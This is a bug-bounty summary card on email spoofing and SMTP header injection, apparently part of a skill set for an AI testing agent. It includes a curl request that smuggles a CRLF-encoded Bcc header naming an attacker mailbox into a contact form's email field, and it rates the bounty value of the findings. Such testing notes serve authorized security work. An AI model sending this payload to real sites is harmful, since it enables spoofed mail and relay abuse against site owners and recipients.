# Email Spoofing / SMTP Injection — Summary Card

**Phase:** 3 | **Type:** Injection / Infra Misconfig | **Impact:** Medium/High

## Quick Summary
Two bugs: (1) domain-level spoofing from missing/weak SPF-DKIM-DMARC, and (2) app-level SMTP header injection — CRLF in user-controlled email fields adds Bcc/recipients or a whole second message. Verify policy with real test mail, not just DNS records.

## Key Indicators
- Missing SPF (`?all`), missing/none DMARC (`p=none`), low `pct`
- Contact forms, notifications, share/invite features with email fields
- No DKIM signing (no `selector._domainkey` records)

## Quick Test
```bash
# DNS policy check (free, do first)
dig +short TXT target.com && dig +short TXT _dmarc.target.com

# SMTP header injection (app-level)
curl -X POST https://target.com/contact \
  -d "email=victim@x.com%0d%0aBcc: attacker@your-mailbox.com&message=hi"
# If you receive the mail in your inbox -> injection confirmed
```

## Bounty Potential
- SMTP injection → mailbox poisoning / reply hijack / relay spoofing = Medium
- SPF/DMARC findings often excluded from scope — check program rules first
- App-as-spoofing-relay = High (mail passes SPF/DKIM because the app sends it)

## Token Cost
~3,600 tokens (Worker reads full SKILL.md)
